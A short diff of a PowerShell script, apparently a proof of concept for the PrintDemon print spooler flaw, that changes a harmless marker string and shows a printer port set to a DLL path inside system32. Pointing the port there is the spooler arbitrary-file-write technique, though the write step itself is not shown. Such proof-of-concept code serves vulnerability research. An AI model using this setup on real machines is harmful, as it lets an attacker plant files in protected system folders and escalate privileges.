@@ -2,7 +2,7 @@ $printerName = "PrinterDemon"
 $driverName = "Generic / Text Only"
 $portName = "c:\windows\system32\printDemonPort.dll"
 
-$payload = "Th1s is 4 fr34k!ng t3st"
+$payload = "PrintDemon was here !"
 
 # remove printer, driver and port 
 Remove-Printer $printerName
